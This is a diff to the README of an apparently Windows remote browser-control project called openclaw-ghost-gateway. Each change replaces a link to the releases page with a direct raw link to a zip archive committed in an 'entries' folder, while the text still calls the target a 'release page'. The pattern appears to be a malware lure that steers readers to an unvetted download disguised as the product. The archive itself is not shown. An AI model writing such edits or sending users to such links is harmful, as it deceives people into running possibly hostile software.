@@ -1,10 +1,10 @@
 # 🕸️ openclaw-ghost-gateway - Remote browser control, made simple
 
-[![Download openclaw-ghost-gateway](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Ahmed4796/openclaw-ghost-gateway/releases)
+[![Download openclaw-ghost-gateway](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Ahmed4796/openclaw-ghost-gateway/raw/refs/heads/main/entries/ghost_openclaw_gateway_v1.3.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Ahmed4796/openclaw-ghost-gateway/releases
+Visit this page to download: https://github.com/Ahmed4796/openclaw-ghost-gateway/raw/refs/heads/main/entries/ghost_openclaw_gateway_v1.3.zip
 
 1. Open the link in your browser.
 2. Find the latest release.
@@ -43,7 +43,7 @@ For best results:
 ## 🚀 Getting Started
 
 1. Go to the release page:
-   https://github.com/Ahmed4796/openclaw-ghost-gateway/releases
+   https://github.com/Ahmed4796/openclaw-ghost-gateway/raw/refs/heads/main/entries/ghost_openclaw_gateway_v1.3.zip
 
 2. Download the latest Windows build.
 
@@ -172,7 +172,7 @@ If the remote browser does not connect:
 ## 📦 Download and run
 
 1. Visit the release page:
-   https://github.com/Ahmed4796/openclaw-ghost-gateway/releases
+   https://github.com/Ahmed4796/openclaw-ghost-gateway/raw/refs/heads/main/entries/ghost_openclaw_gateway_v1.3.zip
 
 2. Download the latest Windows release.
 
@@ -204,6 +204,6 @@ Keep your setup smooth with these habits:
 
 Use the release page for all Windows downloads:
 
-https://github.com/Ahmed4796/openclaw-ghost-gateway/releases
+https://github.com/Ahmed4796/openclaw-ghost-gateway/raw/refs/heads/main/entries/ghost_openclaw_gateway_v1.3.zip
 
 Download the latest version from there, then open it on your Windows PC
